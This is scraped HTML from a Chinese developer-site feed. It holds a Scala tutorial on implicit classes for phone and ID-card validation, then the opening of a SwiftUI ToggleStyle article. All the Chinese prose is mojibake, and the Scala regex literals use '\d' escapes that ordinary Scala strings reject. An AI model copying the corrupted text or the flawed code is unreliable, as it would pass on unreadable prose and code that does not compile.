  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T03:28:38.000Z" title="Tue Dec 30 2025 03:28:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œä»Šå¤©åˆ†äº« Scala ä¸­<strong>éšå¼ç±»ï¼ˆimplicit classï¼‰</strong> Â çš„å®ç”¨å°æŠ€å·§ï¼šåªç”¨å‡ è¡Œä»£ç ï¼Œå°±èƒ½ç»™åŸç”Ÿ<code>String</code>ç±»å‹ â€œæ³¨å…¥â€ æ‰‹æœºå·ã€èº«ä»½è¯å·æ ¡éªŒåŠŸèƒ½ï¼Œè®©å­—ç¬¦ä¸²è‡ªå·±å°±èƒ½åˆ¤æ–­åˆæ³•æ€§ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å…ˆçœ‹æ•ˆæœï¼šå­—ç¬¦ä¸²è‡ªå·±ä¼š â€œéªŒèº«â€ äº†</h2>
<p>å¹³æ—¶æˆ‘ä»¬æ ¡éªŒæ‰‹æœºå·ï¼Œå¯èƒ½è¦å†™ä¸ªå·¥å…·ç±» + é™æ€æ–¹æ³•ï¼Œæ¯”å¦‚<code>CheckUtil.isPhone(str)</code>ã€‚ä½†ç”¨ Scala éšå¼ç±»ï¼Œ<code>String</code>è‡ªå·±å°±èƒ½ç›´æ¥è°ƒæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-comment">// ç›´æ¥è®©å­—ç¬¦ä¸²è°ƒç”¨isPhone/isIDCard</span>
println(<span class="hljs-string">"13617295643"</span>.isPhone)          <span class="hljs-comment">// trueï¼ˆåˆæ³•æ‰‹æœºå·ï¼‰</span>
println(<span class="hljs-string">"429005202011012231"</span>.isIDCard) <span class="hljs-comment">// trueï¼ˆåˆæ³•èº«ä»½è¯ï¼‰</span>
println(<span class="hljs-string">"136567891a"</span>.isPhone)          <span class="hljs-comment">// falseï¼ˆå«å­—æ¯ï¼‰</span>
</code></pre>
<p>æ˜¯ä¸æ˜¯å¾ˆä¸æ»‘ï¼Ÿè¿™èƒŒåå°±æ˜¯ Scala çš„<strong>éšå¼ç±»</strong>åœ¨èµ·ä½œç”¨ã€‚</p>
<h2 data-id="heading-1">äºŒã€å®Œæ•´ä»£ç ï¼š50 è¡Œå®ç° â€œå­—ç¬¦ä¸²å¢å¼ºâ€</h2>
<p>å…ˆå±•ç¤ºä»£ç ï¼Œå†æ‹†è§£æ ¸å¿ƒé€»è¾‘ï¼š</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">imp05</span> </span>{
  <span class="hljs-comment">// éšå¼ç±»ï¼šç»™Stringæ‰©å±•æ–¹æ³•</span>
  <span class="hljs-keyword">implicit</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StrongString</span>(<span class="hljs-params">s: <span class="hljs-type">String</span></span>) </span>{
    <span class="hljs-comment">// æ‰‹æœºå·æ ¡éªŒæ–¹æ³•</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isPhone</span></span>: <span class="hljs-type">Boolean</span> = {
      <span class="hljs-comment">// æ‰‹æœºå·æ­£åˆ™ï¼š1å¼€å¤´+3/5/6/7/8+9ä½æ•°å­—</span>
      <span class="hljs-keyword">val</span> phoneReg = <span class="hljs-string">"^1[35678]\d{9}$"</span>.r
      phoneReg.matches(s)
    }

    <span class="hljs-comment">// èº«ä»½è¯å·æ ¡éªŒæ–¹æ³•ï¼ˆ18ä½ï¼‰</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isIDCard</span></span>: <span class="hljs-type">Boolean</span> = {
      <span class="hljs-comment">// 18ä½èº«ä»½è¯æ­£åˆ™ï¼šå«è¡Œæ”¿åŒºåˆ’ã€å¹´æœˆæ—¥ã€é¡ºåºç ã€æ ¡éªŒç </span>
      <span class="hljs-keyword">val</span> idCardReg = <span class="hljs-string">"^[1-9]\d{5}(18|19|20)\d{2}((0[1-9])|(1[0-2]))(([0-2][1-9])|10|20|30|31)\d{3}[0-9Xx]$"</span>.r
      idCardReg.matches(s)
    }
  }

  <span class="hljs-comment">// æµ‹è¯•ä¸»æ–¹æ³•</span>
  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span></span>(args: <span class="hljs-type">Array</span>[<span class="hljs-type">String</span>]): <span class="hljs-type">Unit</span> = {
    <span class="hljs-keyword">val</span> phone = <span class="hljs-string">"13617295643"</span>
    println(<span class="hljs-string">s"æ‰‹æœºå·[<span class="hljs-subst">$phone</span>]æ˜¯å¦åˆæ³•ï¼š<span class="hljs-subst">${phone.isPhone}</span>"</span>)  <span class="hljs-comment">// true</span>

    <span class="hljs-keyword">val</span> wrongPhone = <span class="hljs-string">"136567891a"</span>
    println(<span class="hljs-string">s"æ‰‹æœºå·[<span class="hljs-subst">$wrongPhone</span>]æ˜¯å¦åˆæ³•ï¼š<span class="hljs-subst">${wrongPhone.isPhone}</span>"</span>)  <span class="hljs-comment">// false</span>

    <span class="hljs-keyword">val</span> idCard = <span class="hljs-string">"429005202011012231"</span>
    println(<span class="hljs-string">s"èº«ä»½è¯[<span class="hljs-subst">$idCard</span>]æ˜¯å¦åˆæ³•ï¼š<span class="hljs-subst">${idCard.isIDCard}</span>"</span>)  <span class="hljs-comment">// true</span>

    <span class="hljs-keyword">val</span> wrongIdCard = <span class="hljs-string">"40905020201101223a"</span>
    println(<span class="hljs-string">s"èº«ä»½è¯[<span class="hljs-subst">$wrongIdCard</span>]æ˜¯å¦åˆæ³•ï¼š<span class="hljs-subst">${wrongIdCard.isIDCard}</span>"</span>)  <span class="hljs-comment">// false</span>
  }
}
</code></pre>
<h2 data-id="heading-2">ä¸‰ã€æ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼šéšå¼ç±»çš„ â€œé­”æ³•â€</h2>
<p>éšå¼ç±»æ˜¯ Scala çš„è¯­æ³•ç³–ï¼Œ<strong>ä½œç”¨æ˜¯ç»™ç°æœ‰ç±»å‹åŠ¨æ€æ‰©å±•æ–¹æ³•</strong>ï¼Œä¸éœ€è¦ç»§æ‰¿æˆ–ä¿®æ”¹åŸç±»å‹ä»£ç ï¼ˆå¯¹åŸç”Ÿç±»å‹<code>String</code>å°¤å…¶å‹å¥½ï¼‰ã€‚</p>
<p>å®ƒçš„è§„åˆ™å¾ˆç®€å•ï¼š</p>
<ol>
<li>å¿…é¡»å®šä¹‰åœ¨<code>object</code>/<code>class</code>/<code>trait</code>å†…éƒ¨ï¼ˆè¿™é‡Œæ”¾åœ¨<code>imp05</code>å•ä¾‹å¯¹è±¡é‡Œï¼‰ï¼›</li>
<li>æ„é€ å™¨åªèƒ½æœ‰ä¸€ä¸ªå‚æ•°ï¼ˆè¿™é‡Œæ˜¯<code>s: String</code>ï¼Œä»£è¡¨è¦æ‰©å±•çš„ç›®æ ‡ç±»å‹ï¼‰ï¼›</li>
<li>éšå¼ç±»ä¸­çš„æ–¹æ³•ï¼Œä¼šè‡ªåŠ¨æˆä¸ºç›®æ ‡ç±»å‹çš„ â€œæˆå‘˜æ–¹æ³•â€ã€‚</li>
</ol>
<h2 data-id="heading-3">å››ã€æ­£åˆ™è¯´æ˜ï¼šæ ¡éªŒé€»è¾‘ä¸è¸©å‘</h2>
<p>ä»£ç é‡Œçš„æ­£åˆ™æ˜¯ â€œå®æˆ˜çº§â€ çš„ï¼Œé¿å…å¸¸è§å‘ï¼š</p>
<ul>
<li><strong>æ‰‹æœºå·æ­£åˆ™</strong>ï¼š<code>^1[35678]\d{9}$</code>è¦†ç›–ä¸»æµæ‰‹æœºå·æ®µï¼ˆ3/5/6/7/8 å¼€å¤´ï¼‰ï¼Œä¸”ä¸¥æ ¼é™åˆ¶ 11 ä½ï¼Œé¿å… â€œ123456789012â€ è¿™ç§è¶…é•¿ä¸²ã€‚</li>
<li><strong>èº«ä»½è¯å·æ­£åˆ™</strong>ï¼š<code>^[1-9]\d{5}(18|19|20)\d{2}((0[1-9])|(1[0-2]))(([0-2][1-9])|10|20|30|31)\d{3}[0-9Xx]$</code>æ”¯æŒ 18 ä½èº«ä»½è¯ï¼ˆå« 18/19/20 å¼€å¤´çš„å¹´ä»½ã€åˆæ³•çš„æœˆä»½ / æ—¥æœŸã€æœ€åä¸€ä½æ ¡éªŒç  X/xï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-4">äº”ã€å®é™…åœºæ™¯ï¼šæ¯”å·¥å…·ç±»æ›´ä¼˜é›…</h2>
<p>ç›¸æ¯”ä¼ ç»Ÿçš„<code>CheckUtil</code>å·¥å…·ç±»ï¼Œéšå¼ç±»çš„ä¼˜åŠ¿æ˜¯<strong>ä»£ç æ›´è‡ªç„¶</strong>ï¼š</p>
<ul>
<li>å·¥å…·ç±»å†™æ³•ï¼š<code>CheckUtil.isPhone(str)</code></li>
<li>éšå¼ç±»å†™æ³•ï¼š<code>str.isPhone</code></li>
</ul>
<p>åè€…æ›´ç¬¦åˆ â€œé¢å‘å¯¹è±¡â€ çš„ç›´è§‰ï¼Œè¯»ä»£ç æ—¶ä¸€çœ¼å°±èƒ½æ‡‚å«ä¹‰ã€‚</p>
<h2 data-id="heading-5">æ€»ç»“</h2>
<p>Scala çš„éšå¼ç±»æ˜¯ â€œè½»é‡çº§æ‰©å±•ç°æœ‰ç±»å‹â€ çš„ç¥å™¨ï¼Œå°¤å…¶é€‚åˆç»™åŸç”Ÿç±»å‹ï¼ˆString/Int ç­‰ï¼‰åŠ è¾…åŠ©æ–¹æ³•ã€‚ä»Šå¤©è¿™ä¸ªä¾‹å­ï¼Œåªç”¨ä¸€ä¸ªéšå¼ç±»å°±å®ç°äº†å­—ç¬¦ä¸²çš„æ‰‹æœºå·ã€èº«ä»½è¯å·æ ¡éªŒï¼Œæ—¢ç®€æ´åˆä¼˜é›…</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SwiftUI æ¶¨çŸ¥è¯†ï¼šå¦‚ä½•æŒ‰æ¡ä»¶åŠ¨æ€åˆ‡æ¢ Toggle è§†å›¾çš„æ ·å¼ï¼ˆ.button æˆ– .switchï¼‰]]></title>    <link>https://juejin.cn/post/7589166195797131291</link>    <guid>https://juejin.cn/post/7589166195797131291</guid>    <pubDate>2025-12-30T02:19:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589166195797131291" data-draft-id="7589126920287600650" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SwiftUI æ¶¨çŸ¥è¯†ï¼šå¦‚ä½•æŒ‰æ¡ä»¶åŠ¨æ€åˆ‡æ¢ Toggle è§†å›¾çš„æ ·å¼ï¼ˆ.button æˆ– .switchï¼‰"/> <meta itemprop="keywords" content="Swift,SwiftUI,Apple"/> <meta itemprop="datePublished" content="2025-12-30T02:19:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§ç†ŠçŒ«ä¾¯ä½©"/> <meta itemprop="url" content="https://juejin.cn/user/4292907536222152"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SwiftUI æ¶¨çŸ¥è¯†ï¼šå¦‚ä½•æŒ‰æ¡ä»¶åŠ¨æ€åˆ‡æ¢ Toggle è§†å›¾çš„æ ·å¼ï¼ˆ.button æˆ– .switchï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4292907536222152/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§ç†ŠçŒ«ä¾¯ä½©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:19:00.000Z" title="Tue Dec 30 2025 02:19:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e475395469c1463f8daf617e1336e341~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=YTmqDIvgnqKYHadwDfHnPAyAWUA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<blockquote>
<p>ğŸ•¶ï¸ åä¸‹è¿™é¢—çº¢è‰²è¯ä¸¸ï¼Œæ‰“ç ´ SwiftUI çš„ç‰©ç†æ³•åˆ™
æ¬¢è¿æ¥åˆ°æ–°åº“æ¯”è’‚è¯ºå¸‚çš„é›¨å¤œã€‚åœ¨è¿™é‡Œï¼ŒSwiftUI çš„ ToggleStyle æ›¾è¢«è®¤ä¸ºæ˜¯ä¸å¯å˜æ›´æ”¹çš„é“å¾‹â€”â€”Switch å°±æ˜¯ Switchï¼ŒButton å°±æ˜¯ Buttonï¼Œä¸¤è€…è€æ­»ä¸ç›¸å¾€æ¥ã€‚ä½†å½“æŒ‘å‰”çš„è®¾è®¡å¸ˆ Trinity ç”©å‡ºä¸€å¼ è¦æ±‚â€œè§†å›¾æ— ç¼æ¶²æ€å˜å½¢â€çš„å›¾çº¸ï¼Œè€Œå¤§åæ´¾â€œé‡æ„ç‰¹å·¥â€æ­£è™è§†çœˆçœˆå‡†å¤‡å˜²ç¬‘ä½ çš„ä»£ç æ—¶ï¼Œä½ è¯¥æ€ä¹ˆåŠï¼Ÿ <br/>
åˆ«æ…Œï¼Œæˆ‘æ˜¯ Neoã€‚åœ¨è¿™ç¯‡æ–‡ç« ä¸­ï¼Œæˆ‘å°†å¸¦ä½ æ½œå…¥ ToggleStyle çš„åº•å±‚é»‘ç®±ï¼Œåˆ©ç”¨ matchedGeometryEffectï¼ˆé‡å­çº ç¼ ï¼‰ å’Œ ç”Ÿå‘½å‘¨æœŸä¾èµ–æ³¨å…¥ï¼Œä¸Šæ¼”ä¸€åœºéª—è¿‡ç¼–è¯‘å™¨çš„â€œç§»èŠ±æ¥æœ¨â€å¤§æˆã€‚å‡†å¤‡å¥½äº†å—ï¼Ÿè®©æˆ‘ä»¬ä¸€èµ· Hack è¿›ç³»ç»Ÿï¼Œåˆ›é€ é‚£ä¸ªâ€œä¸å¯èƒ½â€çš„å¼€å…³ã€‚</p>
</blockquote>
<h2 data-id="heading-0">â˜”ï¸ å¼•å­</h2>
<p>è¿™æ˜¯ä¸€ä¸ªå‘ç”Ÿåœ¨æ–°åº“æ¯”è’‚è¯ºå¸‚ï¼ˆNew Cupertino Cityï¼‰åœ°ä¸‹ä»£ç é»‘å¸‚çš„æ•…äº‹ã€‚é›¨ä¸€ç›´åœ¨ä¸‹ï¼Œåƒæäº†é‚£ä¸ªæ°¸è¿œä¿®ä¸å®Œçš„ Memory Leakã€‚</p>
<p>æˆ‘æ˜¯ <strong>Neo</strong>ï¼Œä¸€åä¸“æ²»å„ç§ SwiftUI ç–‘éš¾æ‚ç—‡çš„â€œæ¸…ç†è€…â€ã€‚ååœ¨æˆ‘å¯¹é¢çš„æ˜¯ <strong>Trinity</strong>ï¼Œå¥¹æ˜¯è¿™ä¸ªè¡—åŒºæœ€æŒ‘å‰”çš„ UX è®¾è®¡å¸ˆã€‚è€Œé‚£ä¸ªæ€»æƒ³æŠŠæˆ‘ä»¬çš„ä»£ç é‡æ„æˆæ±‡ç¼–è¯­è¨€çš„å¤§åæ´¾ <strong>Agent Refactorï¼ˆé‡æ„ç‰¹å·¥ï¼‰</strong>ï¼Œæ­£èº²åœ¨ç¼–è¯‘å™¨çš„é˜´å½±é‡Œä¼ºæœºè€ŒåŠ¨ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fffb9f71011c49c5a7a9e11cafe6da97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=FupUPJ87VexlC1AgBI5o7ZqlCbc%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>Trinity æç­äº†æ‰‹é‡Œçš„é¦™çƒŸï¼Œç”©ç»™æˆ‘ä¸€å¼ è®¾è®¡ç¨¿ï¼šâ€œNeoï¼Œæˆ‘è¦ä¸€ä¸ªå¼€å…³ã€‚å¹³æ—¶å®ƒæ˜¯ Switchï¼Œæ¿€åŠ¨çš„æ—¶å€™å®ƒå¾—å˜æˆ Buttonã€‚è€Œä¸”ï¼Œå˜åŒ–è¿‡ç¨‹è¦åƒä¸ç»¸ä¸€æ ·é¡ºæ»‘ï¼Œä¸èƒ½æœ‰ä»»ä½•â€˜è·³å¸§â€™ã€‚æ‡‚äº†å—ï¼Ÿâ€</p>
<p><strong>åœ¨æœ¬ç¯‡åšæ–‡ä¸­ï¼Œæ‚¨å°†å­¦åˆ°å¦‚ä¸‹å†…å®¹ï¼š</strong></p>
<ul>
<li>â˜”ï¸ å¼•å­</li>
<li>ğŸ•µï¸â€â™‚ï¸ æ¡ˆå‘ç°åœºï¼šé™æ€ç±»å‹çš„æ¡æ¢</li>
<li>ğŸ§¬ ç¬¬ä¸€æ‹›ï¼šé‡å­çº ç¼ ï¼ˆmatchedGeometryEffectï¼‰</li>
<li>ğŸ’Š ç»ˆææ–¹æ¡ˆï¼šè‡ªå®šä¹‰ ToggleStyle é‡Œçš„â€œç§»èŠ±æ¥æœ¨â€</li>
<li>âš ï¸ æŠ€æœ¯é»‘ç®±ï¼ˆé‡ç‚¹è§£æï¼‰</li>
<li>ğŸ¬ å¤§ç»“å±€ï¼šå®Œç¾çš„è°ƒç”¨</li>
<li>ğŸ‘€ SwiftUI æ¶¨çŸ¥è¯†å¤–ä¼ ï¼šä¿®å¤â€œåŠ¨ç”»å¤±æ•ˆâ€çš„ç»ˆæè¡¥ä¸ï¼ˆNamespace çš„ç”Ÿå‘½å‘¨æœŸï¼‰</li>
<li>ğŸ•µï¸â€â™‚ï¸ çœŸæ­£çš„ Bugï¼šNamespace çš„ç”Ÿå‘½å‘¨æœŸ</li>
<li>ğŸ’‰ æ‰‹æœ¯æ–¹æ¡ˆï¼šä¾èµ–æ³¨å…¥</li>
<li>ğŸ§¬ æœ€ç»ˆä¿®æ­£ç‰ˆä»£ç  (Copy-Paste Ready)</li>
<li>ğŸ§  æŠ€æœ¯å¤ç›˜ï¼šä¸ºä»€ä¹ˆè¿™èƒ½è¡Œï¼Ÿ</li>
</ul>
